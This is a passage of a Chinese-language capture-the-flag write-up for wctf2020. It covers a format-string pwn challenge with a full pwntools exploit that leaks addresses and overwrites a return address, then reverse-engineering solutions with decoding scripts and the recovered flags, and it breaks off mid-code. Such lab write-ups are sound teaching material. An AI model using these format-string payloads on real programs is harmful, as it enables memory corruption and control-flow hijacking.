<span class="title">fmt_attack</span><span class="params">(_DWORD *a1)</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> format; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;format, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( *a1 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No way!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = <span class="number">1</span>;</span><br><span class="line">  read_n(&amp;format, <span class="number">40</span>);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;format, <span class="number">40L</span>L);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>用完会把相应的变量置1。</p><p>此外，这道题保护全开：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure></div><p>太有意思啦~</p><h3 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h3><p>保护全开所以没法改GOT表，还需要泄漏地址绕过地址随机化保护。</p><p>leak那个函数跟开玩笑似的（哼，就不用它）。</p><p>所以攻击思路就是利用好<strong>格式化字符串漏洞</strong>：</p><ol><li>先泄漏程序基址和栈地址</li><li>然后再修改程序返回地址，跳过<code>close(1)</code>，直接打印flag</li></ol><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x00000f48      85c0           test eax, eax</span><br><span class="line">0x00000f4a      7554           jne 0xfa0</span><br><span class="line">0x00000f4c      bf01000000     mov edi, 1</span><br><span class="line">0x00000f51      e832faffff     call sym.imp.close</span><br><span class="line"></span><br><span class="line">0x00000f56      be00000000     mov esi, 0</span><br><span class="line">0x00000f5b      488d3d170200.  lea rdi, str.flag           ; 0x1179 ; &quot;&#x2F;flag&quot;</span><br><span class="line">0x00000f62      b800000000     mov eax, 0</span><br><span class="line">0x00000f67      e844faffff     call sym.imp.open</span><br><span class="line">0x00000f6c      89459c         mov dword [rbp - 0x64], eax</span><br><span class="line">0x00000f6f      488d4da0       lea rcx, [rbp - 0x60]</span><br></pre></td></tr></table></figure></div><blockquote><p>直接跳到0x00000f56这里，绕过close(1)</p></blockquote><p>问题在于格式化字符串漏洞只能用一次，而完成上述攻击至少需要利用<strong>两次</strong>。</p><p>这也不难，因为限制次数的变量也在<strong>栈中</strong>，所以只要在泄漏地址的同时，把限制次数的变量清零即可。</p><p>payload1:</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sl(<span class="string">'%7$hhn%17$p.%16$p'</span>)</span><br></pre></td></tr></table></figure></div><blockquote><p>清空变量、泄漏程序基址、泄漏栈地址。</p></blockquote><p>payload2:</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'%%%dc'</span>%(flag&amp;<span class="number">0xffff</span>)+<span class="string">'%10$hn'</span></span><br><span class="line">payload = payload.ljust(<span class="number">16</span>,<span class="string">'A'</span>)</span><br><span class="line">payload+= p64(stack)</span><br><span class="line">sl(payload)</span><br></pre></td></tr></table></figure></div><blockquote><p>覆盖返回地址为打印flag部分代码地址</p></blockquote><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./baby'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = <span class="string">'../libc.so.6'</span></span><br><span class="line"></span><br><span class="line">is_local = <span class="literal">False</span></span><br><span class="line">is_remote = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    is_local = <span class="literal">True</span></span><br><span class="line">    p = process(local_file,env=&#123;<span class="string">'LD_PRELOAD'</span>:remote_libc&#125;)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    is_remote = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> is_local: gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># info</span></span><br><span class="line">sla(<span class="string">'tell me the time:'</span>,<span class="string">'1 1 1'</span>)</span><br><span class="line">sla(<span class="string">'&gt;&gt;'</span>,<span class="string">'2'</span>)</span><br><span class="line">sl(<span class="string">'%7$hhn%17$p.%16$p'</span>)</span><br><span class="line">base = eval(ru(<span class="string">'.'</span>))<span class="number">-4140</span></span><br><span class="line">stack = eval(ru(<span class="string">'\n'</span>))<span class="number">-40</span></span><br><span class="line">info_addr(<span class="string">'stack'</span>,stack)</span><br><span class="line">flag = base+<span class="number">0xF56</span></span><br><span class="line">info_addr(<span class="string">'flag'</span>,flag&amp;<span class="number">0xffff</span>)</span><br><span class="line">sla(<span class="string">'&gt;&gt;'</span>,<span class="string">'2'</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">payload = <span class="string">'%%%dc'</span>%(flag&amp;<span class="number">0xffff</span>)+<span class="string">'%10$hn'</span></span><br><span class="line">payload = payload.ljust(<span class="number">16</span>,<span class="string">'A'</span>)</span><br><span class="line">payload+= p64(stack)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="Cr0ssfun"><a href="#Cr0ssfun" class="headerlink" title="Cr0ssfun"></a>Cr0ssfun</h2><p>和<a href="http://taqini.space/2020/02/16/sarctf-writeup/#Reverse">Sarctf - Crossw0rd</a> 一样的套路</p><blockquote><p>flag: wctf2020{cpp_@nd_r3verse_@re_fun}</p></blockquote><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p>加密：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">stream = fopen(<span class="string">"flag"</span>, <span class="string">"r"</span>);</span><br><span class="line">fread(ptr, <span class="number">1u</span>LL, <span class="number">0x14</span>uLL, stream);</span><br><span class="line">fclose(stream);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">19</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( i &amp; <span class="number">1</span> )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%ld\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(ptr[i] &lt;&lt; i));</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%ld\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(i * ptr[i]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>解密：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line">c = [<span class="number">198</span>, <span class="number">232</span>, <span class="number">816</span>, <span class="number">200</span>, <span class="number">1536</span>, <span class="number">300</span>, <span class="number">6144</span>, <span class="number">984</span>, <span class="number">51200</span>, <span class="number">570</span>, <span class="number">92160</span>, <span class="number">1200</span>, <span class="number">565248</span>, <span class="number">756</span>, <span class="number">1474560</span>, <span class="number">800</span>, <span class="number">6291456</span>, <span class="number">1782</span>, <span class="number">65536000</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="comment">#print i,</span></span><br><span class="line">    <span class="keyword">if</span> i&amp;<span class="number">1</span>:</span><br><span class="line">        ch = c[i<span class="number">-1</span>]&gt;&gt;i</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ch = c[i<span class="number">-1</span>]/i</span><br><span class="line">    <span class="keyword">print</span> chr(ch),</span><br><span class="line"></span><br><span class="line"><span class="comment"># wctf2020&#123;d9-dE6-20c&#125;</span></span><br></pre></td></tr></table></figure></div><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>解法同flag</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> upx -d level2</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> rabin2 -zz lv2/level2 | grep ctf </span></span><br><span class="line">6579 0x000a1068 0x080ea068 21  22   .data   ascii   wctf2020&#123;Just_upx_-d&#125;</span><br></pre></td></tr></table></figure></div><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>base64换表。直接照抄下来编译运行输出新表</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> base64_table[] = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">char</span> v0,result;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = base64_table[i];</span><br><span class="line">    base64_table[i] = base64_table[<span class="number">19</span> - i];</span><br><span class="line">    result = <span class="number">19</span> - i;</span><br><span class="line">    base64_table[result] = v0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(base64_table);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>然后用新表解base64即可</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line">table = <span class="string">'TSRQPONMLKJIHGFEDCBAUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line">c = <span class="string">'d2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d</span><span class="params">(table)</span>:</span>                 </span><br><span class="line">    l = [table.index(i) <span class="keyword">for</span> i <span class="keyword">in</span> c]</span><br><span class="line">    s = [bin(i)[<span class="number">2</span>:].rjust(<span class="number">6</span>,<span class="string">'0'</span>) <span class="keyword">for</span> i <span class="keyword">in</span> l]</span><br><span class="line">    <span class="keyword">print</span> (hex(int(<span class="string">''</span>.join(s),<span class="number">2</span>))[<span class="number">2</span>:<span class="number">-1</span>]+<span class="string">'0'</span>).decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">d(table)</span><br></pre></td></tr></table></figure></div><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>运行程序，输出如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Practice my Data Structure code.....</span><br><span class="line">Typing....Struct.....char....*left....*right............emmmmm...OK!</span><br><span class="line">Traversal!</span><br><span class="line">Traversal type 1:2f0t02T&#123;hcsiI_SwA__r7Ee&#125;</span><br><span class="line">Traversal type 2:20f0Th&#123;2tsIS_icArE&#125;e7__w</span><br><span class="line">Traversal type 3:    &#x2F;&#x2F;type3(&amp;x[22]);   No way!</span><br></pre></td></tr></table></figure></div><p>….</p><p>二叉树啊…常见的烤盐数据结构题目，已知中序后序求先序…就是节点有点多…懒得写jio本，直接手解</p><p><a href="http://image.taqini.space/img/EC2F7D6D508D15D0F715897F481CDE0B.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="http://image.taqini.space/img/EC2F7D6D508D15D0F715897F481CDE0B.jpg" src="/img/loading.gif" class="lazyload"></a></p><p>被迫复习二叉树，感谢出题人。</p><blockquote><p>flag: wctf2020{This_IS_A_7reE}</p></blockquote><h2 id="funnyre"><a href="#funnyre" class="headerlink" title="funnyre"></a>funnyre</h2><p>复制过来，逆序输出…</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">de</span><span class="params">(<span class="keyword">char</span> a)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> tmp = a;</span><br><span class="line">    tmp = tmp - <span class="string">'\b'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'\x15'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'&lt;'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'\x18'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'\a'</span>;</span><br><span class="line">    tmp = tmp - <span 